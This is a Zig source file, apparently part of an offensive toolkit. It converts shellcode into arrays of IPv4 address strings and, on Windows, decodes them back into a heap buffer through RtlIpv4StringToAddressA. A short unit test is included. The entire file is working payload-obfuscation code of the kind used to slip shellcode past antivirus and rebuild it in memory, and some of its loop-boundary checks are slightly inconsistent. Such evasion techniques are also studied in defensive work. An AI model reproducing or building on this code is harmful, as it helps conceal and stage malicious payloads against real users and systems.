const win32 = @import("zigwin32").everything;
const std = @import("std");

const util = @import("../utils.zig");

pub fn ipv4fuscation(buf: *[16:0]u8, a: u8, b: u8, c: u8, d: u8) [:0]u8 {
    return std.fmt.bufPrintZ(buf, "{d}.{d}.{d}.{d}", .{a, b, c, d}) catch unreachable;
}

/// ipv4 obfuscation
pub fn ipv4_obfuscation_output(allocator: std.mem.Allocator, shellcode: []u8) !bool {
    const stdout = std.io.getStdOut().writer();
    const padded_str = try util.pad_to_blocksize(allocator, shellcode, 4);
    defer allocator.free(padded_str);

    const arr_size = shellcode.len / 4;

    try stdout.print("const ipv4_array = [_][:0]const u8{{\n\t", .{});

    var count: usize = 0;
    var buf: [16:0]u8 = undefined;

    var i: usize = 0;
    while (i < shellcode.len): (i += 4) {
        count += 1;
        const ip = ipv4fuscation(&buf, padded_str[i], padded_str[i+1], padded_str[i+2], padded_str[i+3]);

        if (i == shellcode.len - 4) {
            try stdout.print("\"{s}\"",  .{ip});
        } else {
            try stdout.print("\"{s}\", ",  .{ip});
        }

        if ((count % 8 == 0) and (i != arr_size - 1)) {
            try stdout.print("\n\t",  .{});
        }
    }

    try stdout.print("\n}};\n", .{});

    return true;
}

/// ipv4 deobfuscation
pub fn ipv4_deobfuscation(ipv4_array: []const[:0]const u8, d_address: *?*u8, d_size: *usize) bool {
    var status: i32 = undefined;
    var p_buf: ?*u8 = null;

    const num_element = ipv4_array.len;
    const shellcode_buf_size = num_element * 4;

    p_buf = @ptrCast(win32.HeapAlloc(win32.GetProcessHeap(), win32.HEAP_NONE, shellcode_buf_size));
    if (p_buf == null) return false;

    var tmp_buf: [*]u8 = @ptrCast(p_buf);

    for (ipv4_array) |ip| {
        var terminator: ?win32.PSTR= null;
        var addr: win32.IN_ADDR = undefined;

        status = win32.RtlIpv4StringToAddressA(ip, 0, &terminator, &addr);
        if (status != 0) {
            _ = win32.HeapFree(win32.GetProcessHeap(), win32.HEAP_NONE, p_buf);
            return false;
        }

        tmp_buf[0] = addr.S_un.S_un_b.s_b1;
        tmp_buf[1] = addr.S_un.S_un_b.s_b2;
        tmp_buf[2] = addr.S_un.S_un_b.s_b3;
        tmp_buf[3] = addr.S_un.S_un_b.s_b4;

        tmp_buf += 4;
    }

    d_address.* = p_buf;
    d_size.* = shellcode_buf_size;

    return true;
}

test "generate single ipv4" {
    var buf: [16:0]u8 = undefined;
    const out = ipv4fuscation(&buf, 0xff, 0x22, 0x21, 0x03);

    const expected = "255.34.33.3";

    try std.testing.expectEqualStrings(expected, out);
}
